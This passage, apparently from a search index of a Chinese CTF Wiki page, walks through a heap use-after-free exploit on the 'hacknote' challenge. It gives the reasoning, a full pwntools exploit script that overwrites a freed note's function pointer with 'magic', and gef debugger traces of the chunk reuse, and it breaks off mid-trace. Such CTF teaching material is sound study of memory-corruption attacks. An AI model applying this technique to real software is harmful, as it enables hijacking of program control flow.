\u90a3\u4e48\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5728\u5806\u7684\u5b9e\u73b0\u4e2d\u6240\u5b66\u5230\u7684\uff0c\u663e\u7136note\u662f\u4e00\u4e2afastbin chunk\uff08\u5927\u5c0f\u4e3a16\u5b57\u8282\uff09\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5e0c\u671b\u4e00\u4e2anote\u7684put\u5b57\u6bb5\u4e3amagic\u7684\u51fd\u6570\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u60f3\u529e\u6cd5\u8ba9\u67d0\u4e2anote\u7684put\u6307\u9488\u88ab\u8986\u76d6\u4e3amagic\u5730\u5740\u3002\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u53ea\u6709\u552f\u4e00\u7684\u5730\u65b9\u5bf9put\u8fdb\u884c\u8d4b\u503c\u3002\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5229\u7528\u5199real content\u7684\u65f6\u5019\u6765\u8fdb\u884c\u8986\u76d6\u3002\u5177\u4f53\u91c7\u7528\u7684\u601d\u8def\u5982\u4e0b   \u7533\u8bf7note0\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09  \u7533\u8bf7note1\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09  \u91ca\u653enote0  \u91ca\u653enote1  \u6b64\u65f6\uff0c\u5927\u5c0f\u4e3a16\u7684fast bin chunk\u4e2d\u94fe\u8868\u4e3anote1- note0  \u7533\u8bf7note2\uff0c\u5e76\u4e14\u8bbe\u7f6ereal content\u7684\u5927\u5c0f\u4e3a8\uff0c\u90a3\u4e48\u6839\u636e\u5806\u7684\u5206\u914d\u89c4\u5219  note2\u5176\u5b9e\u4f1a\u5206\u914dnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u3002  real content \u5bf9\u5e94\u7684chunk\u5176\u5b9e\u662fnote0\u3002  \u5982\u679c\u6211\u4eec\u8fd9\u65f6\u5019\u5411note3\u7684chunk\u90e8\u5206\u5199\u5165magic\u7684\u5730\u5740\uff0c\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u6ca1\u6709note1\u4e3aNULL\u3002\u5f53\u6211\u4eec\u518d\u6b21\u5c1d\u8bd5\u8f93\u51fanote1\u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8c03\u7528magic\u51fd\u6570\u3002", 
            "title": "\u5229\u7528\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_5", 
            "text": "#!/usr/bin/env python  # -*- coding: utf-8 -*-  from   pwn   import   *  r   =   process ( ./hacknote )  def   addnote ( size ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 1 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( size )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   delnote ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 2 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  def   printnote ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 3 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  #gdb.attach(r)  magic   =   0x08048986  addnote ( 32 ,   aaaa )   # add note 0  addnote ( 32 ,   ddaa )   # add note 1  delnote ( 0 )   # delete note 0  delnote ( 1 )   # delete note 1  addnote ( 8 ,   p32 ( magic ))   # add note 2  printnote ( 0 )   # print note 0  r . interactive ()   \u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u770b\u4e00\u4e0b\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u9996\u5148\u5148\u4e0b\u65ad\u70b9  \u4e24\u5904malloc\u4e0b\u65ad\u70b9  gef\u27a4  b *0x0804875C\nBreakpoint  1  at 0x804875c\ngef\u27a4  b *0x080486CA\nBreakpoint  2  at 0x80486ca  \u4e24\u5904free\u4e0b\u65ad\u70b9  gef\u27a4  b *0x08048893\nBreakpoint  3  at 0x8048893\ngef\u27a4  b *0x080488A9\nBreakpoint  4  at 0x80488a9  \u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7533\u8bf7note0\u65f6\uff0c\u6240\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5757\u5730\u5740\u4e3a0x0804b008\u3002\uff08eax\u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u503c\uff09  $eax     :   0x0804b008    \u2192    0x00000000  $ebx     :   0x00000000  $ecx     :   0xf7fac780    \u2192    0x00000000  $edx     :   0x0804b008    \u2192    0x00000000  $esp     :   0xffffcf10    \u2192    0x00000008  $ebp     :   0xffffcf48    \u2192    0xffffcf68    \u2192    0x00000000  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xf7fac000    \u2192    0x001b1db0  $eip     :   0x080486cf    \u2192    add_note + 89   add   esp ,   0x10  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   zero   SIGN   trap   INTERRUPT   direction   overflow   resume   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500 \n     0 x80486c2   add_note + 76      add      DWORD   PTR   [ eax ],   eax \n     0 x80486c4   add_note + 78      add      BYTE   PTR   [ ebx + 0x86a0cec ],   al \n     0 x80486ca   add_note + 84      call     0x80484e0   malloc@plt \n  \u2192    0 x80486cf   add_note + 89      add      esp ,   0x10 \n     0 x80486d2   add_note + 92      mov      edx ,   eax \n     0 x80486d4   add_note + 94      mov      eax ,   DWORD   PTR   [ ebp-0x1c ] \n     0 x80486d7   add_note + 97      mov      DWORD   PTR   [ eax * 4 + 0x804a070 ],   edx  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcf10 ,   l8 ]  8  0 xffffcf10 \u2502+ 0x00 :   0x00000008       \u2190   $esp  0 xffffcf14 \u2502+ 0x04 :   0x00000000  0 xffffcf18 \u2502+ 0x08 :   0xf7e29ef5    \u2192    strtol + 5   add   eax ,   0x18210b  0 xffffcf1c \u2502+ 0x0c :   0xf7e27260    \u2192    atoi + 16   add   esp ,   0x1c  0 xffffcf20 \u2502+ 0x10 :   0xffffcf58    \u2192    0xffff0a31    \u2192    0x00000000  0 xffffcf24 \u2502+ 0x14 :   0x00000000  0 xffffcf28 \u2502+ 0x18 :   0x0000000a  0 xffffcf2c \u2502+ 0x1c :   0x00000000  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  --- Type   return   to   continue ,   or   q   return   to   quit---  [ #0] 0x80486cf \u2192 Name: add_note()  [ #1] 0x8048ac5 \u2192 Name: main()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    heap   chunk   0x0804b008  UsedChunk ( addr = 0x804b008 ,   size = 0x10 )  Chunk   size :   16   ( 0x10 )  Usable   size :   12   ( 0xc )  Previous   chunk   size :   0   ( 0x0 )  PREV_INUSE   flag :   On  IS_MMAPPED   flag :   Off  NON_MAIN_ARENA   flag :   Off   \u7533\u8bf7note 0\u7684content\u7684\u5730\u5740\u4e3a0x0804b018  $eax     :   0x0804b018    \u2192    0x00000000  $ebx     :   0x0804b008    \u2192    0x0804865b    \u2192    print_note_content + 0   push   ebp  $ecx     :   0xf7fac780    \u2192    0x00000000  $edx     :   0x0804b018    \u2192    0x00000000  $esp     :   0xffffcf10    \u2192    0x00000020  $ebp     :   0xffffcf48    \u2192    0xffffcf68    \u2192    0x00000000  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xf7fac000    \u2192    0x001b1db0  $eip     :   0x08048761    \u2192    add_note + 235   add   esp ,   0x10  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   ZERO   sign   trap   INTERRUPT   direction   overflow   resume   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500 \n     0 x8048752   add_note + 220     mov      al ,   ds : 0x458b0804 \n     0 x8048757   add_note + 225     call     0x581173df \n     0 x804875c   add_note + 230     call     0x80484e0   malloc@plt \n  \u2192    0 x8048761   add_note + 235     add      esp ,   0x10 \n     0 x8048764   add_note + 238     mov      DWORD   PTR   [ ebx + 0x4 ],   eax \n     0 x8048767   add_note + 241     mov      eax ,   DWORD   PTR   [ ebp-0x1c ] \n     0 x804876a   add_note + 244     mov      eax ,   DWORD   PTR   [ eax * 4 + 0x804a070 ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcf10 ,   l8 ]  8  0 xffffcf10 \u2502+ 0x00 :   0x00000020       \u2190   $esp  0 xffffcf14 \u2502+ 0x04 :   0xffffcf34    \u2192    0xf70a3233  0 xffffcf18 \u2502+ 0x08 :   0x00000008  0 xffffcf1c \u2502+ 0x0c :   0xf7e27260    \u2192    atoi + 16   add   esp ,   0x1c  0 xffffcf20 \u2502+ 0x10 :   0xffffcf58    \u2192    0xffff0a31    \u2192    0x00000000  0 xffffcf24 \u2502+ 0x14 :   0x00000000  0 xffffcf28 \u2502+ 0x18 :   0x0000000a  0 xffffcf2c \u2502+ 0x1c :   0x00000000  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  --- Type   return   to   continue ,   or   q   return   to   quit---  [ #0] 0x8048761 \u2192 Name: add_note()  [ #1] 0x8048ac5 \u2192 Name: main()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    heap   chunk   0x0804b018  UsedChunk ( addr = 0x804b018 ,   size = 0x28 )  Chunk   size :   40   ( 0x28 )  Usable   size :   36   ( 0x24 )  Previous   chunk   size :   0   ( 0x0 )  PREV_INUSE   flag :   On  IS_MMAPPED   flag :   Off  NON_MAIN_ARENA   flag :   Off   \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230note1\u7684\u5730\u5740\u4ee5\u53ca\u5176content\u7684\u5730\u5740\u5206\u522b\u4e3a0x0804b040 \u548c0x0804b050\u3002  \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230note0\u4e0enote1\u5bf9\u5e94\u7684content\u786e\u5b9e\u662f\u76f8\u5e94\u7684\u5185\u5b58\u5757\u3002  gef \u27a4    grep   aaaa  [+]   Searching   aaaa   in   memory  [+]   In   [ heap ] ( 0x804b000 - 0x806c000 ),   permission = rw- \n   0 x804b018   -   0x804b01c    \u2192     aaaa   gef \u27a4    grep   ddaa  [+]   Searching   ddaa   in   memory  [+]   In   [ heap ] ( 0x804b000 - 0x806c000 ),   permission = rw- \n   0 x804b050   -   0x804b054    \u2192     ddaa    \u4e0b\u9762\u5c31\u662ffree\u7684\u8fc7\u7a0b\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u53d1\u73b0\u9996\u5148\uff0cnote0\u7684content\u88abfree    \u2192    0 x8048893   del_note + 143     call     0x80484c0   free@plt \n    \u21b3     0 x80484c0   free@plt + 0       jmp      DWORD   PTR   ds : 0x804a018 \n        0 x80484c6   free@plt + 6       push     0x18 \n        0 x80484cb   free@plt + 11      jmp      0x8048480 \n        0 x80484d0   __stack_chk_fail@plt + 0   jmp      DWORD   PTR   ds : 0x804a01c  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcf20 ,   l8 ]  8  0 xffffcf20 \u2502+ 0x00 :   0x0804b018    \u2192    aaaa    \u2190   $esp   \u7136\u540e\u662fnote0\u672c\u8eab    \u2192    0 x80488a9   del_note + 165     call     0x80484c0   free@plt \n    \u21b3     0 x80484c0   free@plt + 0       jmp      DWORD   PTR   ds : 0x804a018 \n        0 x80484c6   free@plt + 6       push     0x18 \n        0 x80484cb   free@plt + 11      jmp      0x8048480 \n        0 x80484d0   __stack_chk_fail@plt + 0   jmp      DWORD   PTR   ds : 0x804a01c  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcf20 ,   l8 ]  8  0 xffffcf20 \u2502+ 0x00 :   0x0804b008    \u2192    0x0804865b    \u2192    print_note_content + 0   push   ebp    \u2190   $esp   \u5f53delete\u7ed3\u675f\u540e\uff0c\u6211\u4eec\u89c2\u770b\u4e00\u4e0bbins\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5176\u88ab\u5b58\u653e\u5728\u5bf9\u5e94\u7684fast bin\u4e2d\uff0c  gef \u27a4    heap   bins  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [   Fastbins   for   arena   0xf7fac780   ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  Fastbins [ idx = 0 ,   size = 0x8 ]    \u2190    UsedChunk ( addr = 0x804b008 ,   size = 0x10 )   Fastbins [ idx = 1 ,   size = 0xc ]   0x00  Fastbins [ idx = 2 ,   size = 0x10 ]   0x00  Fastbins [ idx = 3 ,   size = 0x14 ]    \u2190    UsedChunk ( addr = 0x804b018 ,   size = 0x28 )   Fastbins [ idx = 4 ,   size = 0x18 ]   0x00  Fastbins [ idx = 5 ,   size = 0x1c ]   0x00  Fastbins [ idx = 6 ,   size = 0x20 ]   0x00   \u5f53\u6211\u4eec\u5c06note1\u4e5f\u5168\u90e8\u5220\u9664\u5b8c\u6bd5\u540e\uff0c\u518d\u6b21\u89c2\u770bbins\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u5220\u9664\u7684chunk\u5757\u786e\u5b9e\u5904\u4e8e\u8868\u5934\u3002  gef \u27a4    heap   bins  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   Fastbins   for   arena   0xf7fac780   ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  Fastbins [ idx = 0 ,   size = 0x8 ]    \u2190    UsedChunk ( addr = 0x804b040 ,   size = 0x10 )    \u2190    UsedChunk ( addr = 0x804b008 ,   size = 0x10 )   Fastbins [ idx = 1 ,   size = 0xc ]   0x00  Fastbins [ idx = 2 ,   size = 0x10 ]   0x00  Fastbins [ idx = 3 ,   size = 0x14 ]    \u2190    UsedChunk ( addr = 0x804b050 ,   size = 0x28 )    \u2190    UsedChunk ( addr = 0x804b018 ,   size = 0x28 )   Fastbins [ idx = 4 ,   size = 0x18 ]   0x00  Fastbins [ idx = 5 ,   size = 0x1c ]   0x00  Fastbins [ idx = 6 ,   size = 0x20 ]   0x00   \u90a3\u4e48\uff0c\u6b64\u65f6\u5373\u5c06\u8981\u7533\u8bf7note2\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e0bnote2\u90fd\u7533\u8bf7\u5230\u4e86\u4ec0\u4e48\u5185\u5b58\u5757\uff0c\u5982\u4e0b  \u7533\u8bf7note2\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u4e3a0x804b040\uff0c\u5176\u5b9e\u5c31\u662fnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\u3002  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b040  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b040  0 x080486cf   in   add_note   ()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   registers   ] \u2500\u2500\u2500\u2500  $eax     :   0x0804b040    \u2192    0x0804b000    \u2192    0x00000000  $ebx     :   0x00000000  $ecx     :   0xf7fac780    \u2192    0x00000000  $edx     :   0x0804b040    \u2192    0x0804b000    \u2192    0x00000000  $esp     :   0xffffcf10    \u2192    0x00000008  $ebp     :   0xffffcf48    \u2192    0xffffcf68    \u2192    0x00000000  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xf7fac000    \u2192    0x001b1db0  $eip     :   0x080486cf    \u2192    add_note + 89   add   esp ,   0x10  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   